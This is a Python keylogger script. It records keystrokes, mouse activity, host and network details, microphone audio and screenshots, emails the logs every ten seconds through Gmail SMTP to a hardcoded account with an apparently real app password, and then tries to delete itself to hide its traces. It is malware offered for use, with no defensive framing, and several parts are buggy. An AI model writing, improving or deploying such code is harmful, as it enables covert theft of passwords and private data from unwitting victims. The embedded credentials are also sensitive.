import logging                                              # For logging system events
import os                                                   # For interacting with the operating system
import platform                                             # For retrieving system-related information
import smtplib                                              # For sending emails via SMTP
import socket                                               # For networking and obtaining host information
import threading                                            # For creating separate threads for concurrent tasks
import wave                                                 # For handling audio data and saving it as WAV files
import pyscreenshot                                         # For taking screenshots
import sounddevice as sd                                    # For recording audio from the microphone
from pynput import keyboard                                 # For listening to keyboard inputs
from pynput.keyboard import Listener                        # For handling keyboard events
from PIL import Image                                       # For image processing (though not used directly here)


class KeyLogger:
    def __init__(self, time_interval, email, app_password):
        # Initialize keylogger with time interval, email, and app password
        self.interval = time_interval
        self.log = "KeyLogger Started..."  # Initialize log with a start message
        self.email = email  # User email address for sending logs
        self.app_password = app_password  # User app password for email login

    def appendlog(self, string):
        # Append a string to the log
        self.log = self.log + string

    def on_move(self, x, y):
        # Called when the mouse is moved; logs the position
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_move)

    def on_click(self, x, y):
        # Called when the mouse is clicked; logs the position
        current_click = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_click)

    def on_scroll(self, x, y):
        # Called when the mouse is scrolled; logs the position
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_scroll)

    def save_data(self, key):
        # Saves the data of the pressed keys
        try:
            # Tries to convert the key to a character (e.g., 'a', 'b', etc.)
            current_key = str(key.char)
        except AttributeError:
            # If the key is not a character (e.g., space, esc, etc.)
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        # Append the key to the log
        self.appendlog(current_key)

    def send_mail(self, email, app_password, message):
        # Send the captured logs via email
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)  # Connect to Gmail's SMTP server
            server.starttls()  # Start TLS for encryption
            server.login(email, app_password)  # Login to the email account
            server.sendmail(email, email, message)  # Send the log message
            server.quit()  # Quit the server connection
        except Exception as e:
            print(f"Failed to send email: {e}")  # Print error if email fails

    def report(self):
        # Send the captured data (logs) via email
        self.send_mail(self.email, self.app_password, "\n\n" + self.log)
        self.log = ""  # Reset the log after sending
        # Set a timer to call the report function again after the specified interval
        timer = threading.Timer(self.interval, self.report)
        timer.start()  # Start the timer

    def system_information(self):
        # Collect system information (hostname, IP, etc.)
        hostname = socket.gethostname()  # Get system hostname
        ip = socket.gethostbyname(hostname)  # Get system's local IP address
        plat = platform.processor()  # Get processor information
        system = platform.system()  # Get the operating system
        machine = platform.machine()  # Get machine architecture (e.g., x86_64)
        
        # Append each piece of information to the log
        self.appendlog(hostname)
        self.appendlog(ip)
        self.appendlog(plat)
        self.appendlog(system)
        self.appendlog(machine)

    def microphone(self):
        # Record audio from the microphone for 10 seconds
        fs = 44100  # Set the sample rate (44.1 kHz)
        seconds = 10  # Set the recording duration to 10 seconds
        obj = wave.open('sound.wav', 'w')  # Open a WAV file for writing
        obj.setnchannels(1)  # Set number of audio channels (1 = mono)
        obj.setsampwidth(2)  # Set sample width (2 bytes per sample)
        obj.setframerate(fs)  # Set the sample rate
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)  # Record audio
        obj.writeframesraw(myrecording)  # Write the audio data to the file
        sd.wait()  # Wait for the recording to finish

        # Send the recorded audio file as an email attachment (placeholder for actual attachment sending)
        self.send_mail(email="MAIL", app_password="APP_PASSWORD", message=obj)

    def screenshot(self):
        # Take a screenshot using pyscreenshot
        img = pyscreenshot.grab()
        # Send the screenshot as an email attachment (placeholder for actual attachment sending)
        self.send_mail(email="MAIL", app_password="APP_PASSWORD", message=img)

    def run(self):
        # Start the keyboard listener and begin capturing keystrokes
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()  # Start reporting logs at intervals
            keyboard_listener.join()  # Keep listening for keyboard events

        # Start the mouse listener and capture mouse activity (clicks, moves, scrolls)
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

        # Perform system shutdown/cleanup tasks (deleting the script)
        if os.name == "nt":  # For Windows
            try:
                pwd = os.path.abspath(os.getcwd())  # Get the current working directory
                os.system("cd " + pwd)  # Change to the current directory
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))  # Kill the current script
                print('File was closed.')  # Print file closure message
                os.system("DEL " + os.path.basename(__file__))  # Delete the script
            except OSError:
                print('File is close.')  # Error handling if the file cannot be closed

        else:  # For Unix-based systems (Linux/MacOS)
            try:
                pwd = os.path.abspath(os.getcwd())  # Get the current working directory
                os.system("cd " + pwd)  # Change to the current directory
                os.system('pkill leafpad')  # Kill any open leafpad instances (or other editor)
                os.system("chattr -i " +  os.path.basename(__file__))  # Remove immutability attribute
                print('File was closed.')  # Print file closure message
                os.system("rm -rf" + os.path.basename(__file__))  # Delete the script
            except OSError:
                print('File is close.')  # Error handling if the file cannot be closed


# Replace with your email address and app password
email_address = "snapshadow07@gmail.com"
app_password = "pmvp gsrg cvzt ogsb"  # Use your actual Gmail app password here

# Initialize the keylogger with a 10-second interval
keylogger = KeyLogger(10, email_address, app_password)
# Run the keylogger
keylogger.run()
